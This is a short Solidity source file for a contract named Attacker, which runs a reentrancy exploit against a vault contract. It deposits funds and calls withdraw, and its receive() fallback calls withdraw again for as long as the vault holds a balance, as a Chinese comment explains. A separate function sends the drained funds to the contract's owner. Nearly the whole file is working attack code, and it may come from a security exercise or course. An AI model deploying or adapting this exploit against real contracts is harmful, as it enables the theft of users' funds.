// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "need POT to attack");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        // 金库还有钱就再次提款，触发重入
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function withdrawProfits() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
